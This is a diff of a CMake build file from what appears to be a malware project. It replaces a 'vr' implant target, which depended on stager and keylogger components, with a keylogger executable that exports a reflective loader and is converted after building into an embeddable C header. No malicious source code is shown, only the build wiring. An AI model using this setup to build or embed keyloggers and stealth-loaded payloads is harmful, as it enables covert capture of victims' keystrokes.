@@ -22,16 +22,17 @@
 # DEALINGS IN THE SOFTWARE.
 #
 
-file(GLOB_RECURSE SOURCE_FILES *.h *.hpp *.cpp)
-if (VR_PAYLOAD_SERVICE)
-    add_library(vr MODULE ${SOURCE_FILES} ${VR_CONFIG})
-    target_compile_definitions(vr PRIVATE -DVR_PAYLOAD_SERVICE=1)
-else ()
-    add_executable(vr WIN32 ${SOURCE_FILES} ${VR_CONFIG})
-    export_reflective_loader(vr)
-endif ()
-target_link_libraries(vr shared tiny-json ws2_32 iphlpapi)
-add_dependencies(vr gts keylogger stager)
+file(GLOB_RECURSE SOURCE_FILES *.h *.cpp)
+#add_library(keylogger SHARED ${SOURCE_FILES})
+add_executable(keylogger ${SOURCE_FILES})
+target_link_libraries(keylogger PUBLIC shared psapi)
+export_reflective_loader(keylogger)
 if (NOT MSVC)
-    target_link_libraries(vr mingw32 gcc mingwex gcc msvcrt)   # CRT
+    target_link_libraries(keylogger mingw32 gcc mingwex gcc msvcrt)   # CRT
 endif ()
+
+find_package (Python COMPONENTS Interpreter REQUIRED)
+add_custom_command(TARGET keylogger POST_BUILD
+    COMMAND ${Python_EXECUTABLE} -B ${CMAKE_SOURCE_DIR}/script/bin2h.py $<TARGET_FILE:keylogger> ${OUTPUT_BIN_DIRECTORY}/keylogger.dll.h KEYLOGGER
+    COMMENT "Creating keylogger.dll.h"
+)
